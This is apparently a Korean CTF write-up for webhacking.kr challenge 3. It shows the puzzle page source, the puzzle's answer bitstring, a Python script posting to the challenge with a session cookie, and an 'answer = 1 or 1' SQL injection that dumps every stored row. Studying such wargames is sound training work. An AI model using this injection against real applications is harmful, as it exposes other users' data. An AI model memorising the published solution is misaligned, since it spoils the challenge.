================================================================================================================
[webhacking.kr] 03
================================================================================================================

Flow Chart
================================================================================================================

.. uml::
	
	@startuml

	start

	:Source analysis;

	:True/False check;

	:Blind SQL Injection;

	stop

	@enduml

|

Source analysis
================================================================================================================

해당 페이지는 퍼즐 형식으로 되어 있는데 퍼즐을 풀면 그때부터 문제가 시작됩니다.
해당 퍼즐 정답은 다음과 같습니다.

.. image:: ../../_images/web-03_1.png
        :align: center

.. code-block:: html

    <html>
    <head>
    <title>Challenge 3</title>
    </head>
    <body>
    <center>Puzzle</center>
    <p>
    <hr>
    <form name=kk method=get action=index.php>
    <table border=3 width=500 height=500 align=center bgcolor=white>
    <tr align=center>
    <td colspan=3 rowspan=3 bgcolor=white></td>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>1</td>
    </tr>
    <tr align=center>
    <td>1</td>
    <td>1</td>
    <td>1</td>
    </tr>
    <tr align=center>
    <td>1</td>
    <td>3</td>
    <td>1</td>
    <td>3</td>
    <td>1</td>
    </tr>
    <tr align=center>
    <td>1</td>
    <td>1</td>
    <td>1</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._1.value=1; } else { this.style.background='white';kk._1.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._2.value=1; } else { this.style.background='white';kk._2.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._3.value=1; } else { this.style.background='white';kk._3.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._4.value=1; } else { this.style.background='white';kk._4.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._5.value=1; } else { this.style.background='white';kk._5.value=0; }" >&nbsp;</td>
    </tr>
    <tr align=center>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>0</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._6.value=1; } else { this.style.background='white';kk._6.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._7.value=1; } else { this.style.background='white';kk._7.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._8.value=1; } else { this.style.background='white';kk._8.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._9.value=1; } else { this.style.background='white';kk._9.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._10.value=1; } else { this.style.background='white';kk._10.value=0; }" >&nbsp;</td>
    </tr>
    <tr align=center>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>3</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._11.value=1; } else { this.style.background='white';kk._11.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._12.value=1; } else { this.style.background='white';kk._12.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._13.value=1; } else { this.style.background='white';kk._13.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._14.value=1; } else { this.style.background='white';kk._14.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._15.value=1; } else { this.style.background='white';kk._15.value=0; }" >&nbsp;</td>
    </tr>
    <tr align=center>
    <td>&nbsp;</td>
    <td>1</td>
    <td>1</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._16.value=1; } else { this.style.background='white';kk._16.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._17.value=1; } else { this.style.background='white';kk._17.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._18.value=1; } else { this.style.background='white';kk._18.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._19.value=1; } else { this.style.background='white';kk._19.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._20.value=1; } else { this.style.background='white';kk._20.value=0; }" >&nbsp;</td>
    </tr>
    <tr align=center>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td>5</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._21.value=1; } else { this.style.background='white';kk._21.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._22.value=1; } else { this.style.background='white';kk._22.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._23.value=1; } else { this.style.background='white';kk._23.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._24.value=1; } else { this.style.background='white';kk._24.value=0; }" >&nbsp;</td>
    <td onclick="if(this.style.background!='black') { this.style.background='black'; kk._25.value=1; } else { this.style.background='white';kk._25.value=0; }" >&nbsp;</td>
    </tr>
    </table>
    <input name=_1 size=2 value=0 type=hidden>
    <input name=_2 size=2 value=0 type=hidden>
    <input name=_3 size=2 value=0 type=hidden>
    <input name=_4 size=2 value=0 type=hidden>
    <input name=_5 size=2 value=0 type=hidden>
    <input name=_6 size=2 value=0 type=hidden>
    <input name=_7 size=2 value=0 type=hidden>
    <input name=_8 size=2 value=0 type=hidden>
    <input name=_9 size=2 value=0 type=hidden>
    <input name=_10 size=2 value=0 type=hidden>
    <input name=_11 size=2 value=0 type=hidden>
    <input name=_12 size=2 value=0 type=hidden>
    <input name=_13 size=2 value=0 type=hidden>
    <input name=_14 size=2 value=0 type=hidden>
    <input name=_15 size=2 value=0 type=hidden>
    <input name=_16 size=2 value=0 type=hidden>
    <input name=_17 size=2 value=0 type=hidden>
    <input name=_18 size=2 value=0 type=hidden>
    <input name=_19 size=2 value=0 type=hidden>
    <input name=_20 size=2 value=0 type=hidden>
    <input name=_21 size=2 value=0 type=hidden>
    <input name=_22 size=2 value=0 type=hidden>
    <input name=_23 size=2 value=0 type=hidden>
    <input name=_24 size=2 value=0 type=hidden>
    <input name=_25 size=2 value=0 type=hidden>
    <input name=_answer type=hidden>

    <center><input type=button value='gogo' onclick=go()></center>

    <script>
    function go()
    {
        var answer="";
        for(i=1;i<=25;i++) { 
            answer=answer+eval("kk._"+i+".value"); 
        }
        kk._answer.value=answer;
        kk.submit();
    }
    </script>

    </body>
    </html>

정답 입력후 gogo 버튼을 클릭하면 다음과 같은 화면이 출력된다. 

.. image:: ../../_images/web-03_2.png
        :align: center

소스를 확인해 보면 다음과 같이 post 형식으로 데이터를 보내고 있다.

.. code-block:: html

    <html>
    <head>
    <title>Challenge 3</title>
    </head>
    <body>
    <center>Puzzle</center>
    <p>
    <hr>

    <form name=kk method=get action=index.php>

    </form><form method=post action=index.php><input type=hidden name=answer value=1010100000011100101011111>name : <input type=text name=id maxlength=10 size=10><input type=submit value='write'>

|

True/False check
================================================================================================================


임의의 값을 입력하여 출력되는 메시지를 확인한다.

.. code-block:: python

    import requests

    url = "http://webhacking.kr/challenge/web/web-03/index.php?_1=1&_2=0&_3=1&_4=0&_5=1&_6=0&_7=0&_8=0&_9=0&_10=0&_11=0&_12=1&_13=1&_14=1&_15=0&_16=0&_17=1&_18=0&_19=1&_20=0&_21=1&_22=1&_23=1&_24=1&_25=1&_answer=1010100000011100101011111"
    cookies = {
        "PHPSESSID":"di0tppi0hjd8prirqbkkl6isj2",
    }
    data = {
        "answer": "1",
        "id":"1"
    }
    r = requests.post(url, data=data, cookies = cookies, verify=False)

    print r.content
    
출력 결과는 다음과 같다.

.. code-block:: html

    <html>
    <head>
    <title>Challenge 3</title>
    </head>
    <body>
    <center>Puzzle</center>
    <p>
    <hr>

    <form name=kk method=get action=index.php>

    <p>name : 1<br>answer : 1<br>ip : 125.140.118.254<hr><p>name : 1<br>answer : 1<br>ip : 125.140.118.254<hr><p>name : 1<br>answer : 1<br>ip : 125.140.118.254<hr><p>name : 33<br>answer : 1<br>ip : 125.140.118.254<hr><p>name : 33<br>answer : 1<br>ip : 125.140.118.254<hr><p>name : 33<br>answer : 1||1<br>ip : 125.140.118.254<hr>

|

Blind SQL Injection
================================================================================================================

해당 문제에 입력 부분은 name과 answer이고, 출력 부분은 name, answer, ip이다.
출력 결과를 보면 ip는 항상 같고, answer가 같은 값을 입력한 상태에서 name값을 다르게 입력하면 누적형식으로 쌓인 데이터를 확인할 수 있다. SQL 쿼리문으로 표현하면 다음과 같다.

.. code-block:: sql
    
    select id, answer, ip from $table_name where ip= $_SERVER[REMOTE_ADDR] and answer = $_POST[answer]

$_POST[answer]에 참인 값을 or 형식으로 넣어주면 모든 answer 출력 결과를 얻을 수 있다.

.. code-block:: sql
    
    select id, answer, ip from $table_name where ip= $_SERVER[REMOTE_ADDR] and answer = 1 or 1


